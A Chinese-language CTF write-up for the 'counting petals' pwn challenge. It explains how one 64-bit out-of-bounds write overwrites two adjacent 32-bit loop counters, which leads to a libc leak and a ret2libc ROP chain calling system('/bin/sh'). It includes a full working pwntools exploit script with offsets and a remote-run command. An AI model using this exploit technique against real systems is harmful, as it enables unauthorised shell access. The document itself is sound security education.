# counting petals

## 题目简述

程序反复读取“花朵编号”并把 64 位整数写入栈上数组，但控制循环的两个变量是相邻的 32 位 `int`。数组边界检查不完整，使一次 8 字节越界写能够同时覆盖两个循环变量，进而把后续读写位置引向当前栈帧中的任意槽位。利用分为两轮：第一轮泄露 libc 地址，第二轮在返回地址处布置 ret2libc 链。

## 解题过程

### 1. 用一次 64 位写覆盖两个计数器

逆向后可见数组只容纳前 15 个正常元素，但程序仍会继续读取。数组之后紧邻两个 4 字节循环控制量，因此第 16 次写入的布局为：

```text
低 32 位：第一个循环变量
高 32 位：第二个循环变量
```

例如，十六进制整数 `0x1300000014` 在小端序内存中会同时写入 `0x14` 与 `0x13`。只要根据栈布局选择这两个值，就可以改变循环的索引与上界，使后续一次输入或输出落到数组之外。

第一轮先填满 15 个正常元素，再写入打包后的两个计数器，并补一个值让结果展示逻辑读取保存于栈上的 libc 返回地址。PDF 中使用 `__libc_start_call_main` 附近的偏移 `0x29d90` 计算基址：

```python
libc_base = leaked_address - 0x29D90
```

程序最后还会向结果加一个不可控随机数。随机分支可以预测但无法由输入改写，因此原解法在泄露不符合预期时重连，命中概率约为 $1/2$。

### 2. 第二轮写入 ROP 链

得到 libc 基址后可定位：

```text
pop rdi ; ret     libc_base + 0x2a3e5
ret               libc_base + 0x29139
"/bin/sh"         libc_base + 0x1d8678
system            libc_base + libc.sym["system"]
```

第二轮仍先写 15 个填充值，再用 `0x1200000016` 覆盖两个 32 位循环变量。新的索引使接下来的四个 64 位输入依次覆盖返回地址区域，形成：

```text
pop rdi ; ret
"/bin/sh"
ret
system
```

额外的单独 `ret` 用于在部分 glibc 路径中保持 16 字节栈对齐。

### 3. 整理后的 exploit

以下脚本保留 PDF 中的偏移和两轮输入。旧比赛地址已经失效，远程模式改为显式传入 `HOST`、`PORT`；默认使用本地附件：

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.arch = "amd64"


def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process(elf.path)


while True:
    io = start()
    try:
        # 第一轮：改写循环变量并泄露 libc 地址。
        io.sendlineafter(
            b"How many flowers have you prepared this time?", b"16"
        )
        for i in range(15):
            io.sendlineafter(b"the flower number ", str(i).encode())

        io.sendlineafter(
            b"the flower number ", str(0x1300000014).encode()
        )
        io.sendlineafter(b"the flower number ", b"1")
        io.sendlineafter(
            b"Reply 1 indicates the former and 2 indicates the latter: ",
            b"1",
        )

        io.recvuntil(b"Let's look at the results.")
        fields = io.recvuntil(b"=").split()
        leak = int(fields[36])
        libc.address = leak - 0x29D90
        log.success(f"libc base: {libc.address:#x}")

        pop_rdi = libc.address + 0x2A3E5
        bin_sh = libc.address + 0x1D8678
        ret = libc.address + 0x29139
        system = libc.sym["system"]

        # 第二轮：把后续输入引向保存的返回地址。
        io.sendlineafter(
            b"How many flowers have you prepared this time?", b"16"
        )
    except (EOFError, ValueError, IndexError):
        io.close()
        continue

    for i in range(15):
        io.sendlineafter(b"the flower number ", str(i).encode())

    io.sendlineafter(
        b"the flower number ", str(0x1200000016).encode()
    )
    for value in (pop_rdi, bin_sh, ret, system):
        io.sendlineafter(b"the flower number ", str(value).encode())

    io.sendlineafter(
        b"Reply 1 indicates the former and 2 indicates the latter: ",
        b"1",
    )
    io.interactive()
    break
```

运行远程模式时使用：

```bash
python3 solve.py REMOTE HOST=challenge.example PORT=12345
```

原 PDF 没有记录最终 flag 文本，且当前目录中没有题目二进制与 libc，故这里只保留可审计的利用链，不虚构动态验证结果。另一份公开选手题解也确认了“覆盖两个循环变量、先泄露 libc、再写 ROP”的同一原语，可作交叉参考：[HGAME 2025 Week 1 Writeup](https://summ2.link/categories/CTF/hgame-2025-week1-wp/)。

## 方法总结

本题的关键是数据宽度不一致：程序按 8 字节写数组，而相邻控制字段各占 4 字节，一次越界便能同步控制索引和上界。获得栈上任意读写后，先泄露 libc，再写入 `system("/bin/sh")` 链即可。审计时不能只检查“输入次数”，还要核对数组元素宽度、循环变量布局以及越界后下一次访问真正使用的索引。
